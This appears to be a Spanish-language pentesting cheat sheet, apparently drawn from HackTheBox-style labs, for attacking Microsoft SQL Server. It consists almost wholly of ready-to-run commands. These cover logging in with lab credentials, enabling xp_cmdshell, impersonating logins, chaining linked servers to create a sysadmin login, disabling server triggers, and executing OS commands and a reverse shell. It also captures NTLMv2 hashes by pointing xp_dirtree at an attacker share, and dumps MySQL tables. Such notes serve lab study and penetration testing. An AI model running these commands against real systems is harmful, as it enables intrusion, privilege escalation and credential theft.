
- Primero probar si podemos acceder con credenciales
```bash
netexec mssql 10.10.11.51 -u 'rose' -p 'KxEPkKe6R8su'
```
- Nos conectamos
```bash
impacket-mssqlclient -windows-auth 10.10.11.51/rose:KxEPkKe6R8su@dc01.sequel.htb


impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
```
- Comandos dentro del mssql
```sql
SQL (SEQUEL\rose  guest@master)> select name from sys.databases;
```

- Ver si tengo permisos
```sql
SQL (SEQUEL\rose  guest@master)> xp_cmdshell whoami
SQL (SEQUEL\rose  guest@master)> enable_xp_cmdshell
```

- Impersonar usuario:
```bash
SELECT name FROM sys.server_principals WHERE type IN ('S','U','G');

exec_as_login appdev
```

- Si el usuario es local prueba sin el auth
```bash
impacket-mssqlclient '10.10.11.51/sa:MSSQLP@ssw0rd!@dc01.sequel.htb'
```

## Ver servidor actual

```bash
select @@servername;
```

## Ver permisos

```bash
select permission_name from fn_my_permissions(null, null);
```

## Ver links

```sql
enum_links
use_link "DC02.darkzero.ext"

#Enumerar servidores
select srvname from sysservers;

#Actuar como ellos:
exec('select @@servername;') at [compatibility\poo_config];
exec('select suser_name();') at [compatibility\poo_config];
exec('select permission_name from fn_my_permissions(null, null);') at [compatibility\poo_config];
```

## Ejecutar queries entre servidores

```bash
exec('exec(''select suser_name();'') at [compatibility\poo_public];') at [compatibility\poo_config];


#Crear usuario
SQL> exec('exec(''create login pwned with password = ''''password123#'''';'') at [compatibility\poo_public];') at [compatibility\poo_config];

SQL> exec('exec(''sp_addsrvrolemember ''''pwned'''', ''''sysadmin'''';'') at [compatibility\poo_public];') at [compatibility\poo_config];
```

## Triggers y borrados

```bash
select name from sys.server_triggers;

disable trigger NOMBRE on all server;

```

## Ejecutar comandos con python

```sql
sp_execute_external_script @language=N'python', @script=N'import os; os.system("whoami")'

sp_execute_external_script @language=N'python', @script=N'import os; os.system("type C:\inetpub\wwwroot\web.config")';
```

### Revshell

- https://www.revshells.com/
- La de Powershell #3 (base64)

```bash
SQL (sa  dbo@master)> xp_cmdshell REVSHELL
```

## Sacar NTLM v2

```sql
EXEC xp_dirtree '\\10.10.14.5\share', 1, 1
```

- En local
```bash
responder -I tun0
```

## MYSQL con xamp

- vas a C:/xampp/mysql/bin
```sql
.\mysql.exe -u 'MrGibbonsDB' -p'MisterGibbs!Parrot!?1' -e "show databases;"

.\mysql.exe -u 'MrGibbonsDB' -p'MisterGibbs!Parrot!?1' -e "show tables;" gibbon

.\mysql.exe -u 'MrGibbonsDB' -p'MisterGibbs!Parrot!?1' -e "USE gibbon; select * from gibbonperson;" -E
```

